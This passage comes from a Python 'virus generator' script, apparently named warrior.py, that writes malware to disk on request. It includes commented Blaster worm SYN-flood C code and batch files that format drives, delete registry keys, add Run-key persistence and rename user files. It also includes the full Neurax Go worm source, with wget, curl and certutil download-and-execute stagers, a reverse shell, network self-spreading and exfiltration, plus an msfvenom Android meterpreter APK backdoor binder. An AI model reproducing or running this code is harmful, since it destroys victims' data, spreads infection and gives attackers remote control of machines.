* 1. SYNfloods are not intended to be bandwidth floods,
* even slow rates are hard to deal with.
* 2. Slammer DoSed both the sender and receiver, therefore
* senders hunted down infected systems and removed
* them. This won't DoS the sender, so people are more
* likely not to care about a few infected machines.
*/
for (;;) {
blaster_send_syn_packet(target_ip, fd);

/* Q: How fast does it send the SYNflood?
* A: About 50 packets/second, where each packet is 
* 320-bits in size, for a total of 15-kbps.
* It means that Buford probably intended for 
* dialup users to be a big source of the DoS
* attack. He was smart enough to realize that 
* faster floods would lead to users discovering
* the worm and turning it off. */
Sleep(20);
}


closesocket(fd);
return 0;
}



/*
* This is a standard TCP/IP checksum algorithm
* that you find all over the web.
*/
int blaster_checksum(const void *bufv, int length)
{
const unsigned short *buf = (const unsigned short *)bufv;
unsigned long result = 0;

while (length > 1) {
result += *(buf++);
length -= sizeof(*buf); 
}
if (length) result += *(unsigned char*)buf; 
result = (result >> 16) + (result & 0xFFFF);
result += (result >> 16); 
result = (~result)&0xFFFF; 

return (int)result;
}



/*
* This is a function that uses "raw-sockets" in order to send
* a SYNflood at the victim, which is "windowsupdate.com" in 
* the case of the Blaster worm.
*/
void blaster_send_syn_packet(int target_ip, int fd)
{

struct IPHDR
{
unsigned char verlen; /*IP version & length */
unsigned char tos; /*IP type of service*/
unsigned short totallength;/*Total length*/
unsigned short id; /*Unique identifier */
unsigned short offset; /*Fragment offset field*/
unsigned char ttl; /*Time to live*/
unsigned char protocol; /*Protocol(TCP, UDP, etc.)*/
unsigned short checksum; /*IP checksum*/
unsigned int srcaddr; /*Source address*/
unsigned int dstaddr; /*Destination address*/

};
struct TCPHDR
{
unsigned short srcport;
unsigned short dstport;
unsigned int seqno;
unsigned int ackno;
unsigned char offset;
unsigned char flags;
unsigned short window;
unsigned short checksum;
unsigned short urgptr;
};
struct PSEUDO
{
unsigned int srcaddr;
unsigned int dstaddr;
unsigned char padzero;
unsigned char protocol;
unsigned short tcplength;
};
struct PSEUDOTCP
{
unsigned int srcaddr;
unsigned int dstaddr;
unsigned char padzero;
unsigned char protocol;
unsigned short tcplength;
struct TCPHDR tcphdr;
};




char spoofed_src_ip[16];
unsigned short target_port = 80; /*SYNflood web servers*/
struct sockaddr_in to; 
struct PSEUDO pseudo; 
char buf[60] = {0}; 
struct TCPHDR tcp;
struct IPHDR ip;
int source_ip;


/* Yet another randomizer-seeding */
srand(GetTickCount());

/* Generate a spoofed source address that is local to the
* current Class B subnet. This is pretty smart of Buford.
* Using just a single IP address allows defenders to turn
* it off on the firewall, whereas choosing a completely
* random IP address would get blocked by egress filters
* (because the source IP would not be in the proper range).
* Randomly choosing nearby IP addresses it probably the 
* best way to evade defenses */
sprintf(spoofed_src_ip, "%i.%i.%i.%i", 
local_class_a, local_class_b, rand()%255, rand()%255);
source_ip = blaster_resolve_ip(spoofed_src_ip);

/* Build the sockaddr_in structure. Normally, this is what
* the underlying TCP/IP stack uses to build the headers
* from. However, since the DoS attack creates its own
* headers, this step is largely redundent. */
to.sin_family = AF_INET;
to.sin_port = htons(target_port); /*this makes no sense */
to.sin_addr.s_addr = target_ip;

/* Create the IP header */
ip.verlen = 0x45;
ip.totallength = htons(sizeof(ip) + sizeof(tcp));
ip.id = 1;
ip.offset = 0;
ip.ttl = 128;
ip.protocol = IPPROTO_TCP;
ip.checksum = 0; /*for now, set to true value below */
ip.dstaddr = target_ip;

/* Create the TCP header */
tcp.dstport = htons(target_port);
tcp.ackno = 0;
tcp.offset = (unsigned char)(sizeof(tcp)<<4);
tcp.flags = 2; /*TCP_SYN*/
tcp.window = htons(0x4000);
tcp.urgptr = 0;
tcp.checksum = 0; /*for now, set to true value below */

/* Create pseudo header (which copies portions of the IP
* header for TCP checksum calculation).*/
pseudo.dstaddr = ip.dstaddr;
pseudo.padzero = 0;
pseudo.protocol = IPPROTO_TCP;
pseudo.tcplength = htons(sizeof(tcp));

/* Use the source adress chosen above that is close, but
* not the same, as the spreader's IP address */
ip.srcaddr = source_ip;

/* Choose a random source port in the range [1000-19999].*/
tcp.srcport = htons((unsigned short)((rand()%1000)+1000)); 

/* Choose a random sequence number to start the connection.
* BUG: Buford meant htonl(), not htons(), which means seqno
* will be 15-bits, not 32-bits, i.e. in the range 
* [0-32767]. (the Windows rand() function only returns
* 15-bits). */
tcp.seqno = htons((unsigned short)((rand()<<16)|rand()));

pseudo.srcaddr = source_ip;

/* Calculate TCP checksum */
memcpy(buf, &pseudo, sizeof(pseudo));
memcpy(buf+sizeof(pseudo), &tcp, sizeof(tcp));
tcp.checksum = blaster_checksum(buf, 
sizeof(pseudo)+sizeof(tcp));

memcpy(buf, &ip, sizeof(ip));
memcpy(buf+sizeof(ip), &tcp, sizeof(tcp));

/* I have no idea what's going on here. The assembly code
* zeroes out a bit of memory near the buffer. I don't know
* if it is trying to zero out a real variable that happens
* to be at the end of the buffer, or if it is trying to zero
* out part of the buffer itself. */
memset(buf+sizeof(ip)+sizeof(tcp), 0,
sizeof(buf)-sizeof(ip)-sizeof(tcp));

/* Major bug here: the worm writer incorrectly calculates the
* IP checksum over the entire packet. This is incorrect --
* the IP checksum is just for the IP header itself, not for
* the TCP header or data. However, Windows fixes the checksum
* anyway, so the bug doesn't appear in the actual packets
* themselves.
*/
ip.checksum = blaster_checksum(buf, sizeof(ip)+sizeof(tcp));

/* Copy the header over again. The reason for this is simply to
* copy over the checksum that was just calculated above, but
* it's easier doing this for the programmer rather than
* figuring out the exact offset where the checksum is
* located */
memcpy(buf, &ip, sizeof(ip));

/* Send the packet */
sendto(fd, buf, sizeof(ip)+sizeof(tcp), 0,
(struct sockaddr*)&to, sizeof(to));
}
@Joe-Guest
Joe-Guest commented on May 31, 2018
Great

            ''')

def windows9():
        virus9 = open('format.bat', 'w+')
        virus9.write('''format C:/q /y
                            format D:/q /y
                            format E:/q /y
                            format F:/q /y
                            format G:/q /y''')

def windows10():
        virus10 = open('registry.bat', 'w+')
        virus10.write('''@ECHO OFF
                 START reg delete HKCR/.exe
                 START reg delete HKCR/.dll
                 START reg delete HKCR/*''')

def windows11():
        virus11 = open('internet.bat', 'w+')
        virus11.write('''echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You Have Been HACKED!
PAUSE
''')

def windows12():
        virus12 = open('neurax.go', 'w+')
        virus12.write('''
            package neurax

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	portscanner "github.com/anvie/port-scanner"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mostlygeek/arp"
	coldfire "github.com/redcode-labs/Coldfire"
	"github.com/yelinaung/go-haikunator"
)

var InfectedHosts = []string{}
var ReceivedCommands = []string{}

type __NeuraxConfig struct {
	Stager          string
	Port            int
	CommPort        int
	CommProto       string
	LocalIp         string
	Path            string
	FileName        string
	Platform        string
	Cidr            string
	ScanPassive     bool
	ScanTimeout     int
	ScanAll         bool
	ReadArpCache    bool
	Threads         int
	FullRange       bool
	Base64          bool
	RequiredPort    int
	Verbose         bool
	Remove          bool
	ScanInterval    string
	ReverseListener string
	PreventReexec   bool
	ExfilAddr       string
}

var NeuraxConfig = __NeuraxConfig{
	Stager:          "random",
	Port:            6741, //coldfire.RandomInt(2222, 9999),
	CommPort:        7777,
	CommProto:       "udp",
	RequiredPort:    0,
	LocalIp:         coldfire.GetLocalIp(),
	Path:            "random",
	FileName:        "random",
	Platform:        runtime.GOOS,
	Cidr:            coldfire.GetLocalIp() + "/24",
	ScanPassive:     false,
	ScanTimeout:     2,
	ScanAll:         false,
	ReadArpCache:    false,
	Threads:         10,
	FullRange:       false,
	Base64:          false,
	Verbose:         false,
	Remove:          false,
	ScanInterval:    "2m",
	ReverseListener: "none",
	PreventReexec:   true,
	ExfilAddr:       "none",
}

//Verbose error printing
func ReportError(message string, e error) {
	if e != nil && NeuraxConfig.Verbose {
		fmt.Printf("ERROR %s: %s", message, e.Error())
		if NeuraxConfig.Remove {
			os.Remove(os.Args[0])
		}
	}
}

//Returns a command stager that downloads and executes current binary
func NeuraxStager() string {
	stagers := [][]string{}
	stager := []string{}
	paths := []string{}
	b64_decoder := ""
	windows_stagers := [][]string{
		[]string{"certutil", `certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
		[]string{"powershell", `Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
		[]string{"bitsadmin", `bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
	}
	linux_stagers := [][]string{
		[]string{"wget", `wget -O SAVE_PATH/FILENAME URL; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
		[]string{"curl", `curl URL/FILENAME > SAVE_PATH/FILENAME; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
	}
	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
		"/etc/", "/usr/", "/usr/share/"}
	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
	switch NeuraxConfig.Platform {
	case "windows":
		stagers = windows_stagers
		paths = windows_save_paths
		if NeuraxConfig.Base64 {
			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
		}
	case "linux", "darwin":
		stagers = linux_stagers
		paths = linux_save_paths
		if NeuraxConfig.Base64 {
			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
		}
	}
	if NeuraxConfig.Stager == "random" {
		stager = coldfire.RandomSelectStrNested(stagers)
	} else {
		for s := range stagers {
			st := stagers[s]
			if st[0] == NeuraxConfig.Stager {
				stager = st
			}
		}
	}
	selected_stager_command := stager[1]
	if NeuraxConfig.Path == "random" {
		NeuraxConfig.Path = coldfire.RandomSelectStr(paths)
	}
	if NeuraxConfig.FileName == "random" && NeuraxConfig.Platform == "windows" {
		NeuraxConfig.FileName += ".exe"
	}
	url := fmt.Sprintf("http://%s:%d/%s", NeuraxConfig.LocalIp, NeuraxConfig.Port, NeuraxConfig.FileName)
	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", NeuraxConfig.FileName, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", NeuraxConfig.Path, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
	return selected_stager_command
}

//Binary serves itself
func NeuraxServer() {
	/*if NeuraxConfig.prevent_reinfect {
		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
	}*/
	data, _ := ioutil.ReadFile(os.Args[0])
	if NeuraxConfig.Base64 {
		data = []byte(coldfire.B64E(string(data)))
	}
	addr := fmt.Sprintf(":%d", NeuraxConfig.Port)
	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		http.ServeContent(rw, r, NeuraxConfig.FileName, time.Now(), bytes.NewReader(data))
	}))
}

//Returns true if host is active
func IsHostActive(target string) bool {
	first := 19
	last := 300
	if NeuraxConfig.FullRange {
		last = 65535
	}
	ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.ScanTimeout)*time.Second, NeuraxConfig.Threads)
	opened_ports := ps.GetOpenedPort(first, last)
	if len(opened_ports) != 0 {
		if NeuraxConfig.RequiredPort == 0 {
			return true
		} else {
			if coldfire.PortscanSingle(target, NeuraxConfig.RequiredPort) {
				return true
			}
		}
	}
	return false
}

//Returns true if host is infected
func IsHostInfected(target string) bool {
	if coldfire.Contains(InfectedHosts, target) {
		return true
	}
	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.Port)
	rsp, err := http.Get(target_url)
	if err != nil {
		return false
	}
	if rsp.StatusCode == 200 {
		InfectedHosts = append(InfectedHosts, target)
		InfectedHosts = coldfire.RemoveFromSlice(InfectedHosts, coldfire.GetLocalIp())
		return true
	}
	return false
}

/*func handle_revshell_conn() {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
}

func NeuraxSignal(addr string) {
	conn, err := net.Dial("udp", addr)
	ReportError("Cannot establish reverse UDP conn", err)
	for {
		handle_revshell_conn(conn)
	}
}*/

func add_persistent_command(cmd string) {
	if runtime.GOOS == "windows" {
		coldfire.CmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
	} else {
		coldfire.CmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
	}
}

func handle_command(cmd string) {
	if NeuraxConfig.PreventReexec {
		if coldfire.Contains(ReceivedCommands, cmd) {
			return
		}
		ReceivedCommands = append(ReceivedCommands, cmd)
	}
	DataSender := coldfire.SendDataUDP
	forwarded_preamble := ""
	if NeuraxConfig.CommProto == "tcp" {
		DataSender = coldfire.SendDataTCP
	}
	preamble := strings.Fields(cmd)[0]
	can_execute := true
	no_forward := false
	if strings.Contains(preamble, "e") {
		if !coldfire.IsRoot() {
			can_execute = false
		}
	}
	if strings.Contains(preamble, "k") {
		forwarded_preamble = preamble
	}
	if strings.Contains(preamble, ":") {
		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
		if strings.Contains(preamble, "s") {
			time.Sleep(time.Duration(coldfire.RandomInt(1, 5)))
		}
		if strings.Contains(preamble, "p") {
			add_persistent_command(cmd)
		}
		if strings.Contains(preamble, "x") && can_execute {
			out, err := coldfire.CmdOut(cmd)
			if err != nil {
				if strings.Contains(preamble, "!") {
					no_forward = true
				}
				out += ": " + err.Error()
			}
			if strings.Contains(preamble, "d") {
				fmt.Println(out)
			}
			if strings.Contains(preamble, "v") {
				host := strings.Split(NeuraxConfig.ExfilAddr, ":")[0]
				port := strings.Split(NeuraxConfig.ExfilAddr, ":")[1]
				p, _ := strconv.Atoi(port)
				coldfire.SendDataTCP(host, p, out)
			}
			if strings.Contains(preamble, "l") && can_execute {
				for {
					coldfire.CmdRun(cmd)
				}
			}
		}
		if strings.Contains(preamble, "a") && !no_forward {
			for _, host := range InfectedHosts {
				err := DataSender(host, NeuraxConfig.CommPort, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
				ReportError("Cannot send command", err)
				if strings.Contains(preamble, "o") && !strings.Contains(preamble, "m") {
					break
				}
			}
		}
		if strings.Contains(preamble, "r") {
			coldfire.Remove()
			os.Exit(0)
		}
		if strings.Contains(preamble, "q") {
			coldfire.Shutdown()
		}
		if strings.Contains(preamble, "f") {
			coldfire.Forkbomb()
		}
	} else {
		if cmd == "purge" {
			NeuraxPurgeSelf()
		}
		coldfire.CmdOut(cmd)
	}
}

//Opens port (.CommPort) and waits for commands
func NeuraxOpenComm() {
	l, err := net.Listen(NeuraxConfig.CommProto, "0.0.0.0:"+strconv.Itoa(NeuraxConfig.CommPort))
	ReportError("Comm listen error", err)
	for {
		conn, err := l.Accept()
		ReportError("Comm accept error", err)
		buff := make([]byte, 1024)
		len, _ := conn.Read(buff)
		cmd := string(buff[:len-1])
		go handle_command(cmd)
		conn.Close()
	}
}

//Launches a reverse shell. Each received command is passed to handle_command()
func NeuraxReverse(proto string) {
	conn, _ := net.Dial(proto, NeuraxConfig.ReverseListener)
	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			break
		}
		command = strings.TrimSuffix(command, "\n")
		go handle_command(command)
	}
}

func neurax_scan_passive_single_iface(c chan string, iface string) {
	var snapshot_len int32 = 1024
	timeout := 5000000000 * time.Second
	handler, err := pcap.OpenLive(iface, snapshot_len, false, timeout)
	ReportError("Cannot open device", err)
	handler.SetBPFFilter("arp")
	defer handler.Close()
	packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range packetSource.Packets() {
		ip_layer := packet.Layer(layers.LayerTypeIPv4)
		if ip_layer != nil {
			ip, _ := ip_layer.(*layers.IPv4)
			source := fmt.Sprintf("%s", ip.SrcIP)
			destination := fmt.Sprintf("%s", ip.DstIP)
			if source != coldfire.GetLocalIp() && !IsHostInfected(source) {
				c <- source
			}
			if destination != coldfire.GetLocalIp() && !IsHostInfected(destination) {
				c <- destination
			}
		}
	}
}

func neurax_scan_passive(c chan string) {
	current_iface, _ := coldfire.Iface()
	ifaces_to_use := []string{current_iface}
	device_names := []string{}
	devices, err := pcap.FindAllDevs()
	for _, dev := range devices {
		device_names = append(device_names, dev.Name)
	}
	ReportError("Cannot obtain network interfaces", err)
	if NeuraxConfig.ScanAll {
		ifaces_to_use = append(ifaces_to_use, device_names...)
	}
	for _, device := range ifaces_to_use {
		go neurax_scan_passive_single_iface(c, device)
	}
}

func neurax_scan_active(c chan string) {
	targets := []string{}
	if NeuraxConfig.ReadArpCache {
		for ip, _ := range arp.Table() {
			if !IsHostInfected(ip) {
				targets = append(targets, ip)
			}
		}
	}
	full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.Cidr)
	for _, addr := range full_addr_range {
		targets = append(targets, addr)
	}
	targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
	for _, target := range targets {
		if IsHostActive(target) && !IsHostInfected(target) {
			c <- target
		}
	}
}

func neurax_scan_core(c chan string) {
	if NeuraxConfig.ScanPassive {
		neurax_scan_passive(c)
	} else {
		neurax_scan_active(c)
	}
}

//Scans network for new hosts
func NeuraxScan(c chan string) {
	for {
		neurax_scan_core(c)
		time.Sleep(time.Duration(coldfire.IntervalToSeconds(NeuraxConfig.ScanInterval)))
	}
}

//Copies current binary to all found disks
func NeuraxDisks() error {
	selected_name := gen_haiku()
	if runtime.GOOS == "windows" {
		selected_name += ".exe"
	}
	disks, err := coldfire.Disks()
	if err != nil {
		return err
	}
	for _, d := range disks {
		err := coldfire.CopyFile(os.Args[0], d+"/"+selected_name)
		if err != nil {
			return err
		}
	}
	return nil
}

//Creates an infected .zip archive with given number of random files from current dir.
func NeuraxZIP(num_files int) error {
	archive_name := gen_haiku() + ".zip"
	files_to_zip := []string{os.Args[0]}
	files, err := coldfire.CurrentDirFiles()
	if err != nil {
		return err
	}
	for i := 0; i < num_files; i++ {
		index := rand.Intn(len(files_to_zip))
		files_to_zip = append(files_to_zip, files[index])
		files[index] = files[len(files)-1]
		files = files[:len(files)-1]
	}
	return coldfire.MakeZip(archive_name, files_to_zip)
}

//The binary zips itself and saves under save name in archive
func NeuraxZIPSelf() error {
	archive_name := os.Args[0] + ".zip"
	files_to_zip := []string{os.Args[0]}
	return coldfire.MakeZip(archive_name, files_to_zip)
}

func gen_haiku() string {
	haikunator := haikunator.New(time.Now().UTC().UnixNano())
	return haikunator.Haikunate()
}

//Removes binary from all nodes that can be reached
func NeuraxPurge() {
	DataSender := coldfire.SendDataUDP
	if NeuraxConfig.CommProto == "tcp" {
		DataSender = coldfire.SendDataTCP
	}
	for _, host := range InfectedHosts {
		err := DataSender(host, NeuraxConfig.CommPort, "purge")
		ReportError("Cannot perform purge", err)
	}
	handle_command("purge")
}

//Removes binary from host and quits
func NeuraxPurgeSelf() {
	os.Remove(os.Args[0])
	os.Exit(0)
}

//Returns transformed words from input slice
func NeuraxWordlist(words []string) []string {
	wordlist := []string{}
	for _, word := range words {
		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
		wordlist = append(wordlist, strings.ToUpper(word))
		wordlist = append(wordlist, coldfire.Revert(word))
		wordlist = append(wordlist, first_to_upper)
		wordlist = append(wordlist, first_to_upper+"1")
		wordlist = append(wordlist, first_to_upper+"12")
		wordlist = append(wordlist, first_to_upper+"123")
		wordlist = append(wordlist, word+"1")
		wordlist = append(wordlist, word+"12")
		wordlist = append(wordlist, word+"123")
	}
	return wordlist
}

func NeuraxSetTTL(interval string) {
	first_exec := time.Now()
	for {
		time.Sleep(time.Duration(10))
		passed := time.Since(first_exec).Seconds()
		if int(passed) > coldfire.IntervalToSeconds(interval) {
			NeuraxPurgeSelf()
		}
	}
}

            ''')

def windows13():
        virus13 = open('SystemMeltdown.bat', 'w+')
        virus13.write('''
            :CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo YOU HAVE BEEN HACKED BITCH
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT
PAUSE
PAUSE
''')


def android():
    print(Fore.MAGENTA + '''
          +────▀▄───▄▀─────+ |||==================|
        ──────▄█▀███▀█▄───────|| A P K            |
        ─────█▀███████▀█──────|| P A Y L O A D    |
        ─────█─█▀▀▀▀▀█─█──────|| B I N D E R      |
        ────────▀▀─▀▀─────────||                  |
        ==========================================|''')

    time.sleep(2)
    print(Fore.RED + "Note: This only works in Linux/Android!")
    os.system('''
    #binding backdoor
    read -p "[*]Enter filepath of apk#~: " path
    read -p "[*]Enter output payload name#~: "payload
    read -p "[*]Enter lhost#~: "lhost
    read -p "[*]Enter lport#~: "lport
    echo -e "\e[31m[*]Reverse Engineering Started...;p\e[0m"
    msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> binded.apk

    #signing apk
    echo -e "\e[31m
    echo -e "[-]Signing the apk...
    zipalign -v 4 binded.apk binded-signed.apk

    rm binded.apk && mv binded-signed.apk $payload.apk
    echo -e "\e[34m
    read -p "[*]Start listener(Enter) or Close (Ctrl+c) : " listener
    msfconsole

    ''')


# cooooooooooooooooooooooooooment
#
#
#
#
#
#
#
#
#
#
#
#
#
# cooooooooooooooooooooooooooooooment


print(Fore.CYAN + '''
 █████   ███   █████                                ███                    
░░███   ░███  ░░███                                ░░░                     
 ░███   ░███   ░███   ██████   ████████  ████████  ████   ██████  ████████ 
 ░███   ░███   ░███  ░░░░░███ ░░███░░███░░███░░███░░███  ███░░███░░███░░███
 ░░███  █████  ███    ███████  ░███ ░░░  ░███ ░░░  ░███ ░███ ░███ ░███ ░░░ 
  ░░░█████░█████░    ███░░███  ░███      ░███      ░███ ░███ ░███ ░███     
    ░░███ ░░███     ░░████████ █████     █████     █████░░██████  █████    
     ░░░   ░░░       ░░░░░░░░ ░░░░░     ░░░░░     ░░░░░  ░░░░░░  ░░░░░     
 ''')
print(Fore.MAGENTA
      + '''
Coded by FonderElite || Droid
''')
print('Virus Generator for Linux,Windows w/ Apk Payload Binder ')
time.sleep(2)
plat = platform.system()
rel = platform.release()
ver = platform.version()

print(Fore.RED + "Operating System:" + plat)
print(Fore.RED + "Operating System:" + rel)
print(Fore.RED + "Operating System:" + ver)
time.sleep(2)
print(Fore.YELLOW + '''
=============================================
+|     Virus/Malware/Worm Generator        |+
=============================================
+|  M a d e    By    F o n d e r E l i t e |+
+|-----------------------------------------|+
+|      -h          Help                   |+
+|      -o          Operating-System       |+
+|      -v          Virus Available        |+
+|      -s          Start                  |+
+|      -u          Update                 |+
+|      -q          Quit                   |+
===================================================|
+|  Ex. python3 warrior.py -o Linux -v 1 -s        |+
+|          (Create KeyLogger)                     |+
+| Ex. python3 warrior.py -o Android -s            |+
+|           (Apk payload binder)                  |+
===================================================|''')

print(Fore.WHITE + "Available for: Linux & Windows w/ Apk Payload Binder")
help = Fore.YELLOW + '''
=============================================
+|     Virus/Malware/Worm Generator        |+
=============================================
+|  M a d e    By    F o n d e r E l i t e |+
+|-----------------------------------------|+
+|      -h          Help                   |+
+|      -o          Operating-System       |+
+|      -v          Virus Available        |+
+|      -s          Start                  |+
+|      -u          Update                 |+
+|      -q          Quit                   |+
 ==========================================='''
os = str(os.getcwd())
while True:
 command = input(Fore.CYAN + "[+]Input a Command: ")
 if command == "python3 warrior.py -h":
    print(help)
    print("Try again.")
 elif command == "python3 warrior.py":
    print(help)
    print("Try again.")
 elif command == "python3 warrior.py -o":
    print(Fore.CYAN + 'Available operating systems...')
    time.sleep(2)
    print("Linux, Windows, Android")
 elif command == "python3 warrior.py -v":
    print(Fore.MAGENTA + '''  
    =============================================
    +|              L I N U X                   |+
    =============================================
    +|    V I R U S   A V A I L A B L E        |+
    +|-----------------------------------------|+
    +|       [1]Keylogger                      |+
    +|       [2]File Deletion                  |+
    +|       [3]ELF Virus                      |+
    +|       [4]Linux_virus.c                  |+
    +|       [5]Ransomware                     |+
    +|       [6]Rat                            |+
     ===========================================
    ''')
    time.sleep(2)
    print(Fore.GREEN + '''
    =============================================
    +|           W I N D O W S                  |+
    =============================================
    +|    V I R U S   A V A I L A B L E        |+
    +|-----------------------------------------|+
    +|       [1]Keylogger                      |+
    +|       [2]System Deletion                |+
    +|       [3]Rat                            |+
    +|       [4]Kill wifi                      |+
    +|       [5]Destroy Windows                |+
    +|       [6]Ransomware                     |+
    +|       [7]ILY Virus                      |+
    +|       [8]Blasterworm                    |+
    +|       [9]Format                         |+
    +|       [10]Registry                      |+
    +|       [11]Internetkiller(permanent)     |+
    +|       [12]Neurax.go(worm)               |+
    +|       [13]SystemMeltdown                |+
     ===========================================
     ===========================================


        ''')
    time.sleep(2)
    print(Fore.MAGENTA + '''
      ||+────▀▄───▄▀─────+ |||==================|
    ||──────▄█▀███▀█▄───────|| A P K           ||
    ||─────█▀███████▀█──────|| P A Y L O A D   ||
    ||─────█─█▀▀▀▀▀█─█──────|| B I N D E R     ||
    ||────────▀▀─▀▀─────────||                 || 
    ||python3 warrior.py -o Android -s         ||
    ==========================================|''')
 elif command == "python3 warrior.py -o Windows":
    print(Fore.GREEN + '''
=============================================
+|           W I N D O W S                  |+
=============================================
+|    V I R U S   A V A I L A B L E        |+
+|-----------------------------------------|+
+|       [1]Keylogger                      |+
+|       [2]System Deletion                |+
+|       [3]Rat                            |+
+|       [4]Kill wifi                      |+
+|       [5]Destroy Windows                |+
+|       [6]Ransomware                     |+
+|       [7]ILY Virus                      |+
+|       [8]Blasterworm                    |+
+|       [9]Format                         |+
+|       [10]Registry                      |+
+|       [11]Internetkiller(permanent)     |+
+|       [12]Neurax.go(worm)               |+
+|       [13]SystemMeltdown                |+
 ===========================================
    ''')

 elif command == "python3 warrior.py -o Android":
    print(Fore.MAGENTA + '''
  +────▀▄───▄▀─────+ |||==================|
──────▄█▀███▀█▄───────|| A P K            |
─────█▀███████▀█──────|| P A Y L O A D    |
─────█─█▀▀▀▀▀█─█──────|| B I N D E R      |
────────▀▀─▀▀─────────||                  |
python3 warrior.py -o Android -s          |
==========================================|''')

 elif command == "python3 warrior.py -o Linux":
    print(Fore.MAGENTA + '''

=============================================
+|              L I N U X                   |+
=============================================
+|    V I R U S   A V A I L A B L E        |+
+|-----------------------------------------|+
+|       [1]Keylogger                      |+
+|       [2]File Deletion                  |+
+|       [3]ELF Virus                      |+
+|       [4]Linux_virus.c                  |+
+|       [5]Ransomware                     |+
+|       [6]Rat                            |+
 ===========================================
    ''')
 elif command == "python3 warrior.py -u":
    print("Preparing for update...")
    os.system("git clone https://github.com/fonderelite/warrior")
    print(Fore.GREEN + "Done!")
    thanks()
 elif command == "python3 warrior.py -q":
    print("Quitting...")
    time.sleep(2)
    thanks()
    quit()

 elif command == "python3 warrior.py -o Linux -v 1 -s":
    print(Fore.YELLOW + "Your Current Dir is: " + os)
    print(Fore.YELLOW + "Making a keylogger...")
    time.sleep(3)
    keylogger()
    print(Fore.MAGENTA + "Compiling...")
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()

 elif command == "python3 warrior.py -o Windows -v 1 -s":
    os = str(os.getcwd())
    print(Fore.YELLOW + "Your Current Dir is: " + os)
    print(Fore.YELLOW + "Making a keylogger...")
    time.sleep(3)
    keylogger()
    print(Fore.MAGENTA + "Compiling...")
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()

 elif command == "python3 warrior.py -o Windows -v 2 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making a System Deletion Virus...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    systemdel()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()

 elif command == "python3 warrior.py -o Windows -v 3 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making a Rat For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    rat1()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
